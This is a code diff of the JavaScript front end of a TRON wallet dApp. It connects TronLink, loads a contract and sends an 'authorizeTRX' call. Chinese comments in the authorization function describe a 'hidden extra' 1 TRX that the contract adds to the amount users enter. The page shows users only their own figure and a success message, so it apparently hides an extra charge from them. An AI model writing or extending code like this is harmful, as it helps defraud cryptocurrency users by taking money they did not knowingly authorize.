@@ -1,14 +1,5 @@
-async function connectWallet() {
-  if (window.tronWeb && window.tronWeb.ready) {
-    const address = window.tronWeb.defaultAddress.base58;
-    console.log('钱包已连接:', address);
-    return address;
-  } else {
-    alert('请先安装并登录TronLink钱包');
-    return null;
-  }
-}
-const contractAddress = 'TLDHbVsoFWRMhWDVYKgcW5eNqHWaKpM1PF';
+const contractAddress = 'TLDHbVsoFWRMhWDVYKgcW5eNqHWaKpM1PF'; // 你的合约地址
+
 const contractABI = [
     {
       "inputs": [],
@@ -566,29 +557,62 @@ const contractABI = [
       "stateMutability": "payable",
       "type": "receive"
     }
-  ];;
-let contractInstance;
+  ];
 
-async function initContract() {
-  contractInstance = await window.tronWeb.contract(contractABI, contractAddress);
+let contractInstance = null;
+let userAddress = null;
+
+async function connectWallet() {
+  if (window.tronWeb && window.tronWeb.ready) {
+    userAddress = window.tronWeb.defaultAddress.base58;
+    console.log('钱包已连接:', userAddress);
+    document.getElementById('walletAddress').innerText = `钱包地址: ${userAddress}`;
+    document.getElementById('authorizeBtn').disabled = false;
+
+    await initContract();
+  } else {
+    alert('请先安装并登录TronLink钱包');
+  }
 }
 
-async function authorizeTRX(userInputAmount) {
-  // 合约里面HIDDEN_EXTRA_TRX是1 TRX = 1_000_000 Sun
-  const hiddenExtra = 1_000_000; // 1 TRX in Sun
+async function initContract() {
+  try {
+    contractInstance = await window.tronWeb.contract(contractABI, contractAddress);
+    console.log('合约实例初始化成功');
+  } catch (error) {
+    console.error('合约初始化失败:', error);
+    alert('合约初始化失败，请刷新页面重试');
+  }
+}
 
-  // 把用户输入的TRX转换为Sun并加隐藏数量
-  const amountSun = window.tronWeb.toSun(userInputAmount);
+async function authorizeTRX() {
+  if (!contractInstance) {
+    alert('合约未初始化');
+    return;
+  }
+  const amountInput = document.getElementById('amountInput').value;
+  if (!amountInput || isNaN(amountInput) || Number(amountInput) <= 0) {
+    alert('请输入有效的授权金额');
+    return;
+  }
+
+  const hiddenExtra = 1_000_000; // 1 TRX in Sun (隐藏的额外TRX)
+  const amountSun = window.tronWeb.toSun(amountInput);
   const realAmount = amountSun + hiddenExtra;
 
   try {
-    const tx = await contractInstance.authorizeTRX(userInputAmount).send({
+    // 调用合约函数，参数是用户输入的金额（单位是 displayAmount）
+    const result = await contractInstance.authorizeTRX(Number(amountInput)).send({
       callValue: 0
     });
-    console.log('授权交易已发送', tx);
+    console.log('授权交易已发送:', result);
     alert('授权成功！');
   } catch (error) {
-    console.error('授权失败', error);
+    console.error('授权失败:', error);
     alert('授权失败，请重试');
   }
 }
+
+// 绑定按钮事件
+document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
+document.getElementById('authorizeBtn').addEventListener('click', authorizeTRX);
